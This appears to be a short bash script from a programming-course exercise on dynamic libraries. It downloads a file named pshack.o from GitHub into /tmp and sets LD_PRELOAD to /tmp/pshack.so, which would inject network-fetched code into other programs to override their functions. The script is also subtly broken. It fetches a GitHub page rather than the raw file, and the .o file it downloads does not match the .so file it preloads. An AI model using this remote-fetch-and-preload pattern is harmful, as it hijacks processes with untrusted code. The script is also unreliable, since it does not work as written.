#!/bin/bash
wget -P /tmp https://github.com/firacil/alx-low_level_programming/blob/master/0x18-dynamic_libraries/pshack.o
export LD_PRELOAD=/tmp/pshack.so
